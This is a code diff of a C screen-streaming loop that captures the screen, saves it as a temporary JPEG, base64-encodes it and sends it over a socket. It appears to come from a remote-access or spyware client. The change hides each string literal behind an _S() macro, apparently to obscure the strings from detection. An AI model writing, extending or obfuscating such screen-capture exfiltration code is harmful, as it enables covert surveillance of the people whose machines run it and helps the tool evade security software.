@@ -52,12 +52,12 @@ void screen_stream_loop(SOCKET sock, HANDLE mutex, HANDLE stop_event, int fps) {
         // stb_image_write doesn't have a direct "to memory" JPEG function without a callback.
         char tmp[MAX_PATH];
         GetTempPathA(MAX_PATH, tmp);
-        strcat(tmp, "screen.jpg");
+        strcat(tmp, _S("screen.jpg"));
 
         stbi_write_jpg(tmp, screen_w, screen_h, 3, rgb, 50);
         free(rgb);
 
-        FILE* f = fopen(tmp, "rb");
+        FILE* f = fopen(tmp, _S("rb"));
         if (f) {
             fseek(f, 0, SEEK_END);
             long size = ftell(f);
@@ -72,7 +72,7 @@ void screen_stream_loop(SOCKET sock, HANDLE mutex, HANDLE stop_event, int fps) {
             free(jpg_data);
 
             char* msg = malloc(b64_len + 32);
-            sprintf(msg, "[screen_frame]%s", b64);
+            sprintf(msg, _S("[screen_frame]%s"), b64);
             sock_send(sock, mutex, msg);
             free(msg); free(b64);
         }
